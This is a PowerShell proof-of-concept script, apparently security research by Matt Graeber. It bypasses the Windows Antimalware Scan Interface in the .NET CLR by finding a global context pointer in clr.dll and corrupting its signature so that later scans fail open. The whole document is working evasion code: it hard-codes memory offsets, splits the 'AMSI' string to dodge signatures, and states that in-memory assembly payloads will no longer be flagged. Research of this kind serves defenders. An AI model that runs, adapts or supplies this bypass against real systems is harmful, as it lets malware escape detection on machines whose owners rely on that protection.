function Subvert-CLRAntiMalware {
<#
.SYNOPSIS

A proof-of-concept demonstrating overwriting a global variable that stores a pointer to an antimalware scan interface context structure. This PoC was only built to work with .NET Framework Early Access build 3694.

.DESCRIPTION

clr.dll in .NET Framework Early Access build 3694 has a global variable that stores a pointer to an antimalware scan interface context structure. By reading the pointer at that offset and then overwriting the forst DWORD, the context structure will become corrupted and subsequent scanning calls will fail open.

The purpose of releasing this function is to demonstrate the futility in trying to protect a user-mode security feature from the context of a process that has full control over its memory. The only real mitigation against such subversion attempts is with strong code integrity enforcement.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.EXAMPLE

Subvert-CLRAntiMalware
#>

    [CmdletBinding()]
    param ()

    # Author: Matt Graeber (@mattisfestation)

    $CurrentProc = Get-Process -Id $PID

    $CLRModuleInfo = $CurrentProc.Modules | ? { $_.ModuleName -eq 'clr.dll' }

    $CLRVersion = $CLRModuleInfo.FileVersionInfo.ProductVersion

    $Is64BitProc = $false
    if ([IntPtr]::Size -eq 8) {
        $Is64BitProc = $true
        Write-Verbose 'PowerShell is running as a 64-bit process.'
    } else {
        Write-Verbose 'PowerShell is running as a 32-bit process.'
    }

    $GlobalAMContextOffset = 0

    switch ($CLRVersion) {
        '4.8.3698.0' { # .NET Framework Early Access build 3694
            # https://go.microsoft.com/fwlink/?linkid=2033281
            $GlobalAMContextOffset = 0x006A05DC
            if ($Is64BitProc) { $GlobalAMContextOffset = 0x00A04DA0 }
        }

        default {
            Write-Warning 'Unsupported or newer version of the CLR for which a global context offset was not obtained.'
        }
    }

    if ($GlobalAMContextOffset) {
        Write-Verbose "CLR global AM context offset: 0x$($GlobalAMContextOffset.ToString('X8'))"

        $GlobalAMContextVA = [IntPtr]::Add($CLRModuleInfo.BaseAddress, $GlobalAMContextOffset)

        Write-Verbose "CLR global AM context address: 0x$($GlobalAMContextVA.ToString("X$([IntPtr]::Size * 2)"))"

        $ContextAddress = [Runtime.InteropServices.Marshal]::ReadIntPtr($GlobalAMContextVA)

        Write-Verbose "Context address: 0x$($ContextAddress.ToString("X$([IntPtr]::Size * 2)"))"

        $ContextSig = [Runtime.InteropServices.Marshal]::ReadInt32($ContextAddress)

        $ContextSigString = [Text.Encoding]::ASCII.GetString([BitConverter]::GetBytes($ContextSig))

        Write-Verbose "Context signature: $ContextSigString"

        if ($ContextSigString = 'A'+'M'+'S'+'I') {
            Write-Verbose 'Uncorrupted context signature string found. Corrupting context signature now.'

            [Runtime.InteropServices.Marshal]::WriteInt32($ContextAddress, 0x44434241)

            $ContextSig = [Runtime.InteropServices.Marshal]::ReadInt32($ContextAddress)

            $CorruptedContextSigString = [Text.Encoding]::ASCII.GetString([BitConverter]::GetBytes($ContextSig))

            Write-Verbose "Corrupted context signature: $CorruptedContextSigString"

            Write-Verbose ('A' + 'M' + 'S' + 'I' + ' successfully subverted. Assembly.Load(byte[]) payloads should no longer be flagged.')
        }
    }
}